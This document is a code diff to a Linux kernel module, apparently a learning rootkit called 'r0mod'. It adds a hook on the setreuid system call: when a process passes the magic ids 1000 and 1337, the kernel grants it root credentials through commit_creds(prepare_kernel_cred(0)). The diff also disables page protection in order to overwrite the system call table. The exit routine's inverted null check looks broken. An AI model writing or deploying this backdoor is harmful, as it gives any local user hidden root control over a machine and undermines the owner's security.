@@ -6,6 +6,22 @@
 
 unsigned long **sct;
 
+asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
+asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
+{
+    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);
+
+    if((ruid == 1000) && (euid == 1337))
+    {
+        printk("[Correct]: You got the correct ids.\n");
+        commit_creds(prepare_kernel_cred(0));
+
+        return new_setreuid(0, 0);
+    }
+
+    return orig_setreuid(ruid, euid);
+}
+
 static unsigned long **aquire_sct(void)
 {
     unsigned long int offset = PAGE_OFFSET;
@@ -55,11 +71,16 @@ static int __init r0mod_init(void)
     printk("Module starting...\n");
 
     if(!(sct = aquire_sct()))
-    {
         return -1;
-    }
 
     printk("sys_call_table: %lx\n", (unsigned long)sct);
+
+    disable_page_protection();
+    {
+        orig_setreuid = (void *)sct[__NR_setreuid];
+        sct[__NR_setreuid] = (unsigned long)new_setreuid;
+    }
+    enable_page_protection();
 
     return 0;
 }
@@ -67,6 +88,15 @@ static int __init r0mod_init(void)
 static void __exit r0mod_exit(void)
 {
     printk("Module ending...\n");
+
+    if(!sct)
+    {
+        disable_page_protection();
+        {
+            sct[__NR_setreuid] = (unsigned long)orig_setreuid;
+        }
+        enable_page_protection();
+    }
 }
 
 MODULE_LICENSE("GPL");
